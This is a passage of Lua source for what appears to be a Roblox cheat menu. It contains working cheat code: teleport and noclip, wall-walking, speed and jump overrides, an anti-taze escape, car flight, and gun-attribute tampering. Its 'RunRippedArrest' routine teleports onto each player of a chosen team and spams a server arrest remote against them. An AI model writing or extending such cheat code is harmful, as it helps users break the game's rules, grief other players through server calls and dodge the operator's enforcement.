    Instance.new("UICorner", ind).CornerRadius = UDim.new(0, 2)
    
    if iconId then
        local ico = Instance.new("ImageLabel", btn); ico.Size = UDim2.new(0, 24, 0, 24); ico.Position = UDim2.new(0, 12, 0.5, -12); ico.BackgroundTransparency=1
        ico.Image = "rbxassetid://" .. iconId; ico.ImageColor3 = Color3.fromRGB(200,200,200)
    end
    
    local page = Instance.new("ScrollingFrame", pageContainer)
    page.Size = UDim2.new(1, 0, 1, 0); page.BackgroundTransparency = 1; page.ScrollBarThickness = 2; page.Visible = false
    local layout = Instance.new("UIListLayout", page); layout.Padding = UDim.new(0, 10); layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() page.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y + 20) end)
    
    tabs[name] = {Button=btn, Page=page, Indicator=ind}
    btn.MouseButton1Click:Connect(function() SwitchTab(name) end)
    return page
end

local function CreateSection(page, title, isDual) -- Added legacy param support just in case
    local s = Instance.new("Frame", page)
    s.Size = UDim2.new(1, -10, 0, 30) -- Height scales
    s.BackgroundColor3 = C_ELEM
    Instance.new("UICorner", s).CornerRadius = UDim.new(0, 10)
    
    local lbl = Instance.new("TextLabel", s); lbl.Text = "  " .. title; lbl.Size=UDim2.new(1,0,0,30); lbl.BackgroundTransparency=1; lbl.TextColor3=C_SUBTEXT; lbl.Font=Enum.Font.GothamBold; lbl.TextSize=12; lbl.TextXAlignment=Enum.TextXAlignment.Left
    
    local cont = Instance.new("Frame", s); cont.Size=UDim2.new(1, -20, 0, 0); cont.Position=UDim2.new(0, 10, 0, 35); cont.BackgroundTransparency=1
    local lay = Instance.new("UIListLayout", cont); lay.Padding=UDim.new(0, 8); lay.SortOrder=Enum.SortOrder.LayoutOrder
    lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        cont.Size = UDim2.new(1, -20, 0, lay.AbsoluteContentSize.Y)
        s.Size = UDim2.new(1, -10, 0, lay.AbsoluteContentSize.Y + 45)
    end)
    return cont
end

local function CreateButton(parent, text, color, cb)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
    btn.Text = text
    btn.TextColor3 = color or C_TEXT
    btn.Font = Enum.Font.GothamBold; btn.TextSize = 14
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    Instance.new("UIStroke", btn).Color = Color3.fromRGB(50,50,55); Instance.new("UIStroke", btn).Thickness = 1
    btn.AutoButtonColor = false
    
    btn.MouseButton1Click:Connect(function() 
        TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(50,50,60)}):Play()
        task.wait(0.1)
        TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(32,32,36)}):Play()
        cb(btn) 
    end)
    return btn
end

local function CreateToggle(parent, text, default, cb)
    local frame = Instance.new("TextButton", parent) -- Click anywhere
    frame.Size = UDim2.new(1, 0, 0, 35)
    frame.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
    frame.Text = "  " .. text
    frame.TextColor3 = C_TEXT
    frame.Font = Enum.Font.GothamMedium; frame.TextSize = 14; frame.TextXAlignment = Enum.TextXAlignment.Left
    frame.AutoButtonColor = false
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    
    local ind = Instance.new("Frame", frame)
    ind.Size = UDim2.new(0, 20, 0, 20); ind.Position = UDim2.new(1, -30, 0.5, -10)
    ind.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    Instance.new("UICorner", ind).CornerRadius = UDim.new(0, 4)
    local check = Instance.new("Frame", ind); check.Size=UDim2.new(1,-4,1,-4); check.Position=UDim2.new(0,2,0,2); check.BackgroundColor3=C_ACCENT; check.BackgroundTransparency=1
    Instance.new("UICorner", check).CornerRadius=UDim.new(0, 3)
    
    local state = default or false
    local function Update(s)
        state = s
        TweenService:Create(check, TweenInfo.new(0.2), {BackgroundTransparency = state and 0 or 1}):Play()
        cb(state)
    end
    if state then Update(true) end
    
    frame.MouseButton1Click:Connect(function() Update(not state) end)
    return {SetState = function(self, s) Update(s) end}
end

local function CreateSlider(parent, text, min, max, default, cb)
    local frame = Instance.new("Frame", parent)
    frame.Size = UDim2.new(1, 0, 0, 50)
    frame.BackgroundTransparency = 1
    
    local lbl = Instance.new("TextLabel", frame); lbl.Size=UDim2.new(1,0,0,20); lbl.BackgroundTransparency=1; lbl.Text = text .. ": " .. default; lbl.TextColor3=C_TEXT; lbl.Font=Enum.Font.GothamMedium; lbl.TextSize=14; lbl.TextXAlignment=Enum.TextXAlignment.Left
    
    local bar = Instance.new("Frame", frame); bar.Size=UDim2.new(1,0,0,6); bar.Position=UDim2.new(0,0,0,30); bar.BackgroundColor3=Color3.fromRGB(20,20,25)
    Instance.new("UICorner", bar).CornerRadius=UDim.new(1,0)
    
    local fill = Instance.new("Frame", bar); fill.Size=UDim2.new((default-min)/(max-min),0,1,0); fill.BackgroundColor3=C_ACCENT
    Instance.new("UICorner", fill).CornerRadius=UDim.new(1,0)
    
    local btn = Instance.new("TextButton", bar); btn.Size=UDim2.new(1,0,1,0); btn.BackgroundTransparency=1; btn.Text=""
    local dragging = false
    btn.MouseButton1Down:Connect(function() dragging = true end)
    UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=false end end)
    UIS.InputChanged:Connect(function(i)
        if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
            local p = math.clamp((i.Position.X - bar.AbsolutePosition.X)/bar.AbsoluteSize.X, 0, 1)
            local v = math.floor(min + (max-min)*p)
            fill.Size = UDim2.new(p, 0, 1, 0)
            lbl.Text = text .. ": " .. v
            cb(v)
        end
    end)
    return frame -- Return frame for consistency
end

local function CreateLabel(parent, text, col) -- Added col to signature matching
    local l = Instance.new("TextLabel", parent)
    l.Size = UDim2.new(1, 0, 0, 20); l.BackgroundTransparency=1; l.Text = text; l.TextColor3=col or C_SUBTEXT; l.Font=Enum.Font.Gotham; l.TextSize=13; l.TextXAlignment=Enum.TextXAlignment.Left
    return l
end


--// --- PHASE LOGIC --- //

local function Phase()
    if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
    local root = lp.Character.HumanoidRootPart
    -- Teleport 5 studs forward relative to looking direction
    root.CFrame = root.CFrame * CFrame.new(0, 0, -5)
end

--// --- SPIDER MODE V6 LOGIC --- //

local function GetSpiderNormal(root)
    spiderRayParams.FilterDescendantsInstances = {lp.Character}
    -- Forward
    local fwdRay = root.CFrame.LookVector * 4
    local fwdResult = Workspace:Raycast(root.Position, fwdRay, spiderRayParams)
    if fwdResult and fwdResult.Instance.CanCollide then return fwdResult.Normal end
    -- Down
    local downRay = -root.CFrame.UpVector * 6
    local downResult = Workspace:Raycast(root.Position, downRay, spiderRayParams)
    if downResult and downResult.Instance.CanCollide then return downResult.Normal end
    return nil
end

local function GetSpiderInput()
    local vec = Vector3.new(0, 0, 0)
    if UIS:IsKeyDown(Enum.KeyCode.W) then vec = vec + Vector3.new(0, 0, -1) end
    if UIS:IsKeyDown(Enum.KeyCode.S) then vec = vec + Vector3.new(0, 0, 1) end
    if UIS:IsKeyDown(Enum.KeyCode.A) then vec = vec + Vector3.new(-1, 0, 0) end
    if UIS:IsKeyDown(Enum.KeyCode.D) then vec = vec + Vector3.new(1, 0, 0) end
    return vec
end

local function DisableSpider()
    spiderEnabled = false
    for _, c in pairs(spiderConnections) do c:Disconnect() end
    table.clear(spiderConnections)
    if spiderAnimTrack then spiderAnimTrack:Stop() end
    if lp.Character then
        local root = lp.Character:FindFirstChild("HumanoidRootPart")
        local hum = lp.Character:FindFirstChild("Humanoid")
        if hum then hum.PlatformStand = false end 
        if root then
            if root:FindFirstChild("SpiderRot") then root.SpiderRot:Destroy() end
            if root:FindFirstChild("SpiderMov") then root.SpiderMov:Destroy() end
            if root:FindFirstChild("SpiderAtt") then root.SpiderAtt:Destroy() end
            -- Re-Right
            root.AssemblyAngularVelocity = Vector3.new(0,0,0)
            local upright = CFrame.lookAt(root.Position, root.Position + root.CFrame.LookVector * Vector3.new(1,0,1))
            root.CFrame = upright
        end
    end
end

local function EnableSpider()
    if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
    
    -- Safety Check
    if ghostActive then 
        DisableGhost()
        -- Reset Button Visual
        -- (Optional: Iterate through buttons to turn off visual)
    end
    
    spiderEnabled = true
    local root = lp.Character.HumanoidRootPart
    local hum = lp.Character.Humanoid
    
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://180426354" 
    spiderAnimTrack = hum:LoadAnimation(anim)
    spiderAnimTrack.Priority = Enum.AnimationPriority.Action
    spiderAnimTrack.Looped = true
    
    hum.PlatformStand = true 
    
    local att = Instance.new("Attachment", root)
    att.Name = "SpiderAtt"
    
    local alignRot = Instance.new("AlignOrientation")
    alignRot.Name = "SpiderRot"; alignRot.Mode = Enum.OrientationAlignmentMode.OneAttachment
    alignRot.Attachment0 = att; alignRot.RigidityEnabled = true; alignRot.Parent = root
    
    local moveVel = Instance.new("LinearVelocity")
    moveVel.Name = "SpiderMov"; moveVel.Attachment0 = att; moveVel.MaxForce = math.huge
    moveVel.VectorVelocity = Vector3.new(0,0,0); moveVel.RelativeTo = Enum.ActuatorRelativeTo.World; moveVel.Parent = root
    
    local conn = RunService.RenderStepped:Connect(function(dt)
        if not spiderEnabled or not lp.Character then return end
        
        local normal = GetSpiderNormal(root) or Vector3.new(0, 1, 0)
        local input = GetSpiderInput()
        
        -- Orientation
        local lookDir = root.CFrame.LookVector
        if UIS.MouseBehavior == Enum.MouseBehavior.LockCenter then
            lookDir = cam.CFrame.LookVector
        elseif input.Magnitude > 0 then
            local camCF = cam.CFrame
            local worldMove = (camCF.LookVector * -input.Z) + (camCF.RightVector * input.X)
            if worldMove.Magnitude > 0 then lookDir = worldMove.Unit end
        end
        
        local flatLook = (lookDir - (lookDir:Dot(normal) * normal)).Unit
        if flatLook.Magnitude == 0 then flatLook = root.CFrame.LookVector end
        
        local newRight = flatLook:Cross(normal).Unit
        local newCFrame = CFrame.fromMatrix(root.Position, newRight, normal, -flatLook)
        alignRot.CFrame = newCFrame
        
        -- Movement
        local velocityVec = Vector3.new(0,0,0)
        if input.Magnitude > 0 then
            velocityVec = newCFrame.LookVector * spiderSpeed
            if not spiderAnimTrack.IsPlaying then spiderAnimTrack:Play() end
            spiderAnimTrack:AdjustSpeed(1) 
        else
            if spiderAnimTrack.IsPlaying then spiderAnimTrack:Stop(0.2) end
        end
        
        -- Roof Assist
        local distRay = -normal * 10
        local distResult = Workspace:Raycast(root.Position, distRay, spiderRayParams)
        
        if distResult then
            local error = 3 - distResult.Distance
            local correction = normal * (error * 15)
            velocityVec = velocityVec + correction
        else
            velocityVec = velocityVec + (-normal * 60)
        end
        
        moveVel.VectorVelocity = velocityVec
    end)
    table.insert(spiderConnections, conn)
end

--// --- PLAYER MODS LOGIC --- //
local function EnablePlayerLoop()
    if playerLoop then playerLoop:Disconnect() end
    playerLoop = RunService.RenderStepped:Connect(function()
        if not lp.Character or not lp.Character:FindFirstChild("Humanoid") then return end
        local hum = lp.Character.Humanoid
        
        -- WalkSpeed Override
        if wsEnabled then
            if hum.WalkSpeed ~= wsVal then hum.WalkSpeed = wsVal end
        end
        
        -- JumpPower Override
        if jpEnabled then
             if hum.UseJumpPower ~= true then hum.UseJumpPower = true end
             if hum.JumpPower ~= jpVal then hum.JumpPower = jpVal end
        end
    end)
    table.insert(connections, playerLoop)
end
EnablePlayerLoop()

--// --- STAMINA V3 LOGIC --- //

local function SetupStaminaCharacter(char)
    if not staminaEnabled then return end
    local hum = char:WaitForChild("Humanoid", 5)
    if not hum then return end

    local stateConn = hum.StateChanged:Connect(function(old, new)
        if not staminaEnabled then return end
        if new == Enum.HumanoidStateType.Landed or new == Enum.HumanoidStateType.Running then
            if holdingSpace then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end)
    table.insert(staminaConnections, stateConn)
end

local function EnableStamina()
    staminaEnabled = true
    if lp.Character then SetupStaminaCharacter(lp.Character) end
    
    local loop = RunService.RenderStepped:Connect(function()
        if not staminaEnabled or not lp.Character then return end
        local hum = lp.Character:FindFirstChild("Humanoid")
        if not hum then return end
        
        holdingSpace = UIS:IsKeyDown(Enum.KeyCode.Space)
        if hum.JumpPower < 50 then hum.JumpPower = 50 end
        
        if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then
            if hum.WalkSpeed < 25 then hum.WalkSpeed = 25 end
        end
        
        if holdingSpace and hum.FloorMaterial ~= Enum.Material.Air then
            hum.Jump = true
        end
    end)
    table.insert(staminaConnections, loop)
end

local function DisableStamina()
    staminaEnabled = false
    for _, c in pairs(staminaConnections) do c:Disconnect() end
    table.clear(staminaConnections)
    if lp.Character and lp.Character:FindFirstChild("Humanoid") then
        lp.Character.Humanoid.WalkSpeed = 16
        lp.Character.Humanoid.JumpPower = 50
    end
end

--// --- GHOST WALK V5 LOGIC --- //

local function UpdateGhost()
    if not ghostActive or not ghostVisuals or not lp.Character then 
        if ghostCharacter then ghostCharacter:Destroy() ghostCharacter = nil end
        return 
    end
    
    local root = lp.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    if ghostCharacter then ghostCharacter:Destroy() end
    
    lp.Character.Archivable = true
    ghostCharacter = lp.Character:Clone()
    ghostCharacter.Name = "TaxGhost"
    ghostCharacter.Parent = Workspace
    
    for _, v in pairs(ghostCharacter:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("Sound") then v:Destroy() end
        if v:IsA("BasePart") then
            v.CanCollide = false; v.Anchored = true; v.Massless = true
            v.Material = Enum.Material.ForceField; v.Color = Color3.fromRGB(255, 170, 0)
            v.Transparency = 0.5
        end
    end
    
    local ghostRoot = ghostCharacter:FindFirstChild("HumanoidRootPart")
    if ghostRoot then
        local targetPos = root.Position + Vector3.new(0, 51.5, 0)
        ghostCharacter:PivotTo(CFrame.new(targetPos) * root.CFrame.Rotation)
    end
end

local function CreatePlatform(startPos)
    if ghostPlatform then ghostPlatform:Destroy() end
    ghostLockedY = startPos.Y - 50 - 3.5 
    ghostPlatform = Instance.new("Part", Workspace)
    ghostPlatform.Name = "TaxGhostFloor"
    ghostPlatform.Size = Vector3.new(50, 1, 50)
    ghostPlatform.Anchored = true
    ghostPlatform.CanCollide = true
    ghostPlatform.Transparency = 1 
    ghostPlatform.CFrame = CFrame.new(startPos.X, ghostLockedY, startPos.Z)
end

local function NoclipMap()
    if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
    local pos = lp.Character.HumanoidRootPart.Position
    local regionAbove = Region3.new(pos - Vector3.new(15, 0, 15) + Vector3.new(0, 40, 0), pos + Vector3.new(15, 70, 15))
    local partsAbove = Workspace:FindPartsInRegion3(regionAbove, lp.Character, 50)
    for _, part in pairs(partsAbove) do
        if part:IsA("BasePart") and not part.Parent:FindFirstChild("Humanoid") then
            if ghostOriginalState[part] == nil then ghostOriginalState[part] = part.CanCollide end
            part.CanCollide = false
        end
    end
    local regionAround = Region3.new(pos - Vector3.new(5, 5, 5), pos + Vector3.new(5, 5, 5))
    local partsAround = Workspace:FindPartsInRegion3(regionAround, lp.Character, 20)
    for _, part in pairs(partsAround) do
         if part:IsA("BasePart") and part.Name ~= "TaxGhostFloor" and not part.Parent:FindFirstChild("Humanoid") then
            part.CanCollide = false
        end
    end
end

local function RestoreMap()
    for part, state in pairs(ghostOriginalState) do
        if part and part.Parent then part.CanCollide = true end
    end
    table.clear(ghostOriginalState)
end

local function EnableGhost()
    if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
    
    -- Safety Check
    if spiderEnabled then
        DisableSpider()
    end
    
    local root = lp.Character.HumanoidRootPart
    CreatePlatform(root.Position)
    root.CFrame = root.CFrame + Vector3.new(0, -50, 0)
    ghostActive = true
    
    ghostConnection = RunService.RenderStepped:Connect(function()
        if not ghostActive or not lp.Character then return end
        local rootPart = lp.Character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return end
        
        if ghostPlatform then
            ghostPlatform.CFrame = CFrame.new(rootPart.Position.X, ghostLockedY, rootPart.Position.Z)
        end
        if lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.CameraOffset = Vector3.new(0, 53.5, 0)
        end
        NoclipMap()
        if ghostVisuals then UpdateGhost() end
    end)
end

local function DisableGhost()
    ghostActive = false
    if ghostConnection then ghostConnection:Disconnect() end
    if ghostPlatform then ghostPlatform:Destroy() ghostPlatform = nil end
    if ghostCharacter then ghostCharacter:Destroy() ghostCharacter = nil end
    
    if lp.Character then
        if lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.CameraOffset = Vector3.new(0, 0, 0)
        end
        if lp.Character:FindFirstChild("HumanoidRootPart") then
            lp.Character.HumanoidRootPart.CFrame = lp.Character.HumanoidRootPart.CFrame + Vector3.new(0, 53, 0)
            lp.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0,0,0)
        end
    end
    task.wait(0.1)
    RestoreMap()
    RestoreMap()
end

--// --- TAZE ESCAPE HUD --- //
local function ShowTazeHUD()
    task.spawn(function()
        if lp.PlayerGui:FindFirstChild("TaxEscapeHUD") then lp.PlayerGui.TaxEscapeHUD:Destroy() end
        
        local sg = Instance.new("ScreenGui", lp.PlayerGui); sg.Name = "TaxEscapeHUD"
        local f = Instance.new("Frame", sg); f.Size = UDim2.new(0, 300, 0, 100); f.Position = UDim2.new(0.5, -150, 0.1, 0) -- Top Middle
        f.BackgroundTransparency = 1
        
        local title = Instance.new("TextLabel", f); title.Size = UDim2.new(1,0,0,50); title.BackgroundTransparency=1
        title.Font = Enum.Font.GothamBlack; title.TextSize = 40; title.Text = "*TAZED*"
        title.TextColor3 = Color3.fromRGB(255, 50, 50); title.TextStrokeTransparency = 0
        
        local sub = Instance.new("TextLabel", f); sub.Size = UDim2.new(1,0,0,20); sub.Position = UDim2.new(0,0,0.5,0); sub.BackgroundTransparency=1
        sub.Font = Enum.Font.GothamBold; sub.TextSize = 14; sub.TextColor3 = Color3.fromRGB(255, 255, 255); sub.TextStrokeTransparency = 0.5
        sub.Text = "Escape enabling in..."
        
        local timer = Instance.new("TextLabel", f); timer.Size = UDim2.new(1,0,0,30); timer.Position = UDim2.new(0,0,0.7,0); timer.BackgroundTransparency=1
        timer.Font = Enum.Font.GothamBlack; timer.TextSize = 25; timer.TextColor3 = Color3.fromRGB(255, 255, 255); timer.TextStrokeTransparency = 0
        
        -- Phase 1: Tazed (3.2s)
        for i = 32, 0, -1 do
            timer.Text = string.format("%.1f", i/10)
            task.wait(0.1)
        end
        
        -- Phase 2: Invisible (3.0s)
        title.Text = "INVISIBLE"
        title.TextColor3 = Color3.fromRGB(0, 255, 100) -- Green
        sub.Text = "RUN AWAY NOW!"
        
        for i = 30, 0, -1 do
            timer.Text = string.format("%.1f", i/10)
            task.wait(0.1)
        end
        
        sg:Destroy()
    end)
end

--// --- ANTI-TAZE LOGIC --- //

local function SetupAntiTaze(char)
    if antiTazeConnection then antiTazeConnection:Disconnect() end
    -- Note: antiTazeScriptConnection is unused in old logic, but we disconnect if it exists just in case
    if antiTazeScriptConnection then antiTazeScriptConnection:Disconnect() end
    
    local hum = char:WaitForChild("Humanoid", 5)
    if not hum then return end
    
    antiTazeConnection = hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if not antiTazeEnabled then return end
        
        -- Trigger: Speed is 0 (Tazed)
        if hum.WalkSpeed == 0 then
            -- IGNORE if we are in valid Ghost/Spider modes which might set speed to 0
            if spiderEnabled or ghostActive then return end
            
            if not isTazed and hum.Health > 0 then
                isTazed = true
                warn("Taze Escape: Active")
                
                -- TRIGGER HUD
                ShowTazeHUD()
                
                -- USE EXISTING GHOST FEATURE + VISUALS
                ghostVisuals = true
                EnableGhost()
                if UpdateGhost then UpdateGhost() end
                
                -- Wait out the taze (3.2s) + Escape time (3s) = 6.2s
                task.wait(6.2) 
                
                DisableGhost()
                ghostVisuals = false
                
                isTazed = false
            end
        end
    end)
end

local function EnableAntiTaze()
    antiTazeEnabled = true
    if lp.Character then SetupAntiTaze(lp.Character) end
end

local function DisableAntiTaze()
    antiTazeEnabled = false
    if antiTazeConnection then antiTazeConnection:Disconnect() end
end

--// --- ARREST LOGIC --- //

--// --- CAR MODS LOGIC --- //

local function GetVehicleSeat()
    if not lp.Character then return nil end
    local hum = lp.Character:FindFirstChild("Humanoid")
    if not hum or not hum.SeatPart then return nil end
    if hum.SeatPart:IsA("VehicleSeat") then return hum.SeatPart end
    return nil
end

local function EnableCarSpeed()
    carSpeedEnabled = true
    if carSpeedConnection then carSpeedConnection:Disconnect() end
    carSpeedConnection = RunService.RenderStepped:Connect(function()
        if not carSpeedEnabled then return end
        local seat = GetVehicleSeat()
        if seat then
            seat.MaxSpeed = carSpeedVal
            seat.Torque = math.huge
            
            -- STEERING ASSIST: Add rotation helper since high speed kills traction
            if not seat:FindFirstChild("TaxSpeedRot") then
                local bav = Instance.new("BodyAngularVelocity", seat)
                bav.Name = "TaxSpeedRot"
                bav.MaxTorque = Vector3.new(0, math.huge, 0) 
                bav.AngularVelocity = Vector3.new(0,0,0)
            end
            
            local bav = seat:FindFirstChild("TaxSpeedRot")
            if bav then
                local steer = seat.Steer -- 1, -1, 0
                bav.AngularVelocity = Vector3.new(0, -steer * 2.5, 0) -- Turn power
            end

            -- FIX CAMERA GLITCH: Force subject to Humanoid (Strict)
            local hum = lp.Character and lp.Character:FindFirstChild("Humanoid")
            if hum and cam.CameraSubject ~= hum then
                cam.CameraSubject = hum
            end
        end
    end)
end

local function DisableCarSpeed()
    carSpeedEnabled = false
    if carSpeedConnection then carSpeedConnection:Disconnect() end
    local seat = GetVehicleSeat()
    if seat then
        seat.MaxSpeed = 25 -- Restore to reasonable default
        if seat:FindFirstChild("TaxSpeedRot") then seat.TaxSpeedRot:Destroy() end
    end
end

local function EnableCarFly()
    carFlyEnabled = true
    if carFlyConnection then carFlyConnection:Disconnect() end
    
    local seat = GetVehicleSeat()
    if not seat then return end
    
    -- HOVER PHYSICS SETUP
    
    -- 1. Height (Y-Axis Lock)
    local bp = Instance.new("BodyPosition", seat)
    bp.Name = "TaxCarPos"
    bp.MaxForce = Vector3.new(0, math.huge, 0) 
    bp.P = 10000
    bp.D = 1000
    
    -- 2. Stability (Pitch/Roll Lock)
    local bg = Instance.new("BodyGyro", seat)
    bg.Name = "TaxCarGyro"
    bg.MaxTorque = Vector3.new(math.huge, 0, math.huge) -- Lock X/Z, Free Y (Yaw)
    bg.P = 3000
    bg.D = 100
    bg.CFrame = CFrame.new() 
    
    -- 3. Propulsion (Forward/Back)
    local bv = Instance.new("BodyVelocity", seat)
    bv.Name = "TaxCarVel"
    bv.MaxForce = Vector3.new(math.huge, 0, math.huge) -- Drive X/Z
    bv.Velocity = Vector3.new(0,0,0)
    
    -- 4. Steering (Turning)
    local bav = Instance.new("BodyAngularVelocity", seat)
    bav.Name = "TaxCarRot"
    bav.MaxTorque = Vector3.new(0, math.huge, 0) -- Turn Y only
    bav.AngularVelocity = Vector3.new(0,0,0)
    
    local startY = seat.Position.Y
    
    carFlyConnection = RunService.RenderStepped:Connect(function()
        if not carFlyEnabled or not lp.Character then return end
        local currentSeat = GetVehicleSeat()
        
        -- AUTO DISABLE: If we are no longer in the seat, turn off flight
        if not currentSeat or currentSeat ~= seat then 
             if currentSeat then 
                seat = currentSeat
                if not seat:FindFirstChild("TaxCarPos") then
                     bp = Instance.new("BodyPosition", seat); bp.Name="TaxCarPos"; bp.MaxForce=Vector3.new(0,math.huge,0); bp.P=10000; bp.D=1000
                     bg = Instance.new("BodyGyro", seat); bg.Name="TaxCarGyro"; bg.MaxTorque=Vector3.new(math.huge,0,math.huge); bg.P=3000; bg.D=100; bg.CFrame=CFrame.new()
                     bv = Instance.new("BodyVelocity", seat); bv.Name="TaxCarVel"; bv.MaxForce=Vector3.new(math.huge,0,math.huge)
                     bav = Instance.new("BodyAngularVelocity", seat); bav.Name="TaxCarRot"; bav.MaxTorque=Vector3.new(0,math.huge,0)
                     startY = seat.Position.Y
                end
             else
                -- Exited Car -> Disable
                DisableCarFly()
                if carFlyToggle and carFlyToggle.SetState then carFlyToggle:SetState(false) end
                return 
             end
        end
        
        -- HEIGHT
        local targetY = startY + carFlyHeight
        -- Removed Space/Ctrl checks per user request
        bp.Position = Vector3.new(0, targetY, 0)
        
        -- STABILITY
        bg.CFrame = CFrame.new() -- Keep flat
        
        -- PROPULSION (Throttle)
        -- Use carSpeedVal for speed reference (User confirmed "its just 200", ensure slider updates this)
        local speed = carSpeedVal
        local throttle = seat.Throttle -- 1 (W), -1 (S), 0
        local steer = seat.Steer -- 1 (D), -1 (A), 0
        
        -- Drive in direction of car facing
        bv.Velocity = seat.CFrame.LookVector * (throttle * speed)
        
        -- STEERING
        -- Rotate based on steer input
        bav.AngularVelocity = Vector3.new(0, -steer * 2, 0) -- Multiplier determines turn speed
        
        -- FIX CAMERA GLITCH (Same as Speed Mod)
        if cam.CameraSubject == nil then 
             cam.CameraSubject = seat -- First try seat
             if not cam.CameraSubject then cam.CameraSubject = lp.Character:FindFirstChild("Humanoid") end -- Fallback
        end
    end)
end

local function FlipCar()
    local seat = GetVehicleSeat()
    if seat then
        local cf = seat.CFrame
        local x, y, z = cf:ToOrientation()
        -- Reset Pitch/Roll (X/Z), Keep Yaw (Y), Move Up 5 studs
        seat.CFrame = CFrame.new(seat.Position + Vector3.new(0, 5, 0)) * CFrame.fromOrientation(0, y, 0)
    end
end

local function DisableCarFly()
    carFlyEnabled = false
    if carFlyConnection then carFlyConnection:Disconnect() end
    
    for _, v in pairs(Workspace:GetDescendants()) do
        if v:IsA("VehicleSeat") then
            if v:FindFirstChild("TaxCarPos") then v.TaxCarPos:Destroy() end
            if v:FindFirstChild("TaxCarGyro") then v.TaxCarGyro:Destroy() end
            if v:FindFirstChild("TaxCarVel") then v.TaxCarVel:Destroy() end
            if v:FindFirstChild("TaxCarRot") then v.TaxCarRot:Destroy() end
        end
    end
end



local function Ap(pl)
    local ag = {[1] = pl}
    pcall(function()
        if Ar then
            if Ar.Name == "arrest" and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
                Ar:InvokeServer(pl.Character.HumanoidRootPart)
            else
                Ar:InvokeServer(unpack(ag))
            end
        end
    end)
end

local function Tp(tp)
    local Ch = lp.Character
    local Lh = Ch and Ch:FindFirstChild("HumanoidRootPart")
    local Tc = tp.Character
    local Th = Tc and Tc:FindFirstChild("HumanoidRootPart")
    
    if Lh and Th then
        local duration = 4.2
        local st = tick()
        local cn
        
        cn = RunService.Heartbeat:Connect(function()
            local el = tick() - st
            if el > duration then cn:Disconnect() return end
            
            if Th and Th.Parent and Lh and Lh.Parent then
                local tg = Th.CFrame * CFrame.new(0, 0, 0.9) 
                if Tw then 
                    Lh.CFrame = Lh.CFrame:Lerp(tg, 0.25)
                else 
                    Lh.CFrame = tg
                end
            else
                cn:Disconnect()
            end
        end)
        
        return duration
    end
    return 0
end

local function RunRippedArrest(targetTeamName, btn)
    if isArresting then return end
    isArresting = true
    local oldText = btn.Text
    btn.Text = "RUNNING..."
    
    local cr = {}
    for _, pl in ipairs(Players:GetPlayers()) do
        if pl ~= lp and pl.Team and pl.Team.Name == targetTeamName then
            local ch = pl.Character
            if ch and ch:FindFirstChild("HumanoidRootPart") then
                table.insert(cr, pl)
            end
        end
    end

    if #cr > 0 then
        for _, rc in pairs(cr) do
            if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then break end
            btn.Text = "Arresting: " .. rc.Name
            
            local holdDuration = Tp(rc)
            local startTime = tick()
            while tick() - startTime < holdDuration do
                Ap(rc)
                task.wait(0.15) 
            end
            task.wait(0.1) 
        end
    else
        btn.Text = "NO TARGETS"
        task.wait(1)
    end
    btn.Text = oldText
    isArresting = false
end

local GunModOriginals = setmetatable({}, {__mode = "k"}) -- [Tool] = {Attrs={}, Values={}}
local GunModRegistry = {} -- [Name] = {Keywords={}, Value=..., Enabled=bool}
local gunModDisc = nil

local function ApplyVal(tool, keywords, targetValue, originals)
     for key, val in pairs(tool:GetAttributes()) do
        local name = key:lower()
        if name:find("accurate") and (keywords[1] == "rate" or keywords[1] == "delay") then continue end
        for _, word in pairs(keywords) do
            if name:find(word) and type(val) == type(targetValue) then
                if originals.Attrs[key] == nil then originals.Attrs[key] = val end
                tool:SetAttribute(key, targetValue)
            end
        end
    end
    for _, obj in pairs(tool:GetDescendants()) do
        if obj:IsA("ValueBase") then
            local name = obj.Name:lower()
            if name:find("accurate") and (keywords[1] == "rate" or keywords[1] == "delay") then continue end
            for _, word in pairs(keywords) do
                if name:find(word) and typeof(obj.Value) == typeof(targetValue) then
                     if originals.Values[obj] == nil then originals.Values[obj] = obj.Value end
                     obj.Value = targetValue
                end
            end
        end
    end
end

local function RevertVal(tool, keywords, originals)
     -- Restore Attributes
     for key, savedVal in pairs(originals.Attrs) do
          local name = key:lower()
          for _, word in pairs(keywords) do
               if name:find(word) then
                    tool:SetAttribute(key, savedVal)
                    -- Don't clear immediately if we want to toggle back on? 
                    -- Actually, if we Revert, we assuming Disabled. Clearing is cleaner.
                    -- But loop iteration while modifying?
               end
          end
     end
     -- We need to check if key matches the MOD we are reverting.
     -- Simplified: Simply saving/restoring specific keys is hard if multiple mods touch same key.
     -- BUT with "No Recoil" and "No Spread", they are distinct.
     -- Let's stick to the previous safe logic: Scan tool again.
    for key, val in pairs(tool:GetAttributes()) do
        local name = key:lower()
